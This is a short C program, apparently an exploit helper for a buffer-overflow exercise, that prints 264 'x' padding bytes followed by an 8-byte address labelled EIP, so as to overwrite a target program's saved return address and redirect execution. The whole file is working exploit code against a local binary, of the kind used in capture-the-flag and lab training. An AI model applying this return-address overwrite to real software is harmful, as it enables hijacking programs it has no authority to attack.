#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>

int main(int args, char**argv) {
    int i = 0;
    const char x = 0x78;

    fflush(stdout);

    for(i = 0; i < 264; i++) {
        fwrite(&x, 1, 1, stdout);
    }

    fflush(stdout);

    unsigned long long EIP = 0x0000555555555255;
    fwrite(&EIP, 1, 8, stdout);

    return 0;
}
